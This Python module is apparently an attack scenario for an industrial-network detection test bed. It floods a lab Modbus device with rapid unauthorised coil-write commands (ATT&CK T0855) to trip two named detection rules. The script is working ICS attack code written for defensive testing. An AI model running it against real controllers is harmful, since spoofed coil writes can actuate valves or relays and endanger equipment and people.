"""
Coil Write Injection Attack Scenario

Sends rapid FC05 (Write Single Coil) commands to slave-1, 
targeting various coil addresses. In a real OT network, this 
could open/close actuators, valves, or relays maliciously.

Triggers rules:
- R-002: Unauthorised Write to Coils (because source is not the master)
- R-008: Excessive Write Rate (if > 20 writes in 10s)
"""

import time
import logging
from pymodbus.client import ModbusTcpClient

logger = logging.getLogger("injector")

def run():
    target_ip = "192.168.100.21"
    logger.info("Starting Coil Write Injection (T0855) against %s", target_ip)
    
    client = ModbusTcpClient(target_ip, port=502)
    if not client.connect():
        logger.error("Failed to connect to %s", target_ip)
        return

    logger.info("  -> Sending 30 rapid FC05 (Write Single Coil) commands...")
    for i in range(30):
        # Write to coils 0-9 repeatedly
        coil_addr = i % 10
        try:
            client.write_coil(coil_addr, True, device_id=1)
        except Exception as exc:
            logger.debug("Write failed: %s", exc)
        
        # Extremely fast to trigger R-008 (>20 writes in 10s)
        time.sleep(0.05)

    client.close()
    logger.info("Coil Write Injection complete.")
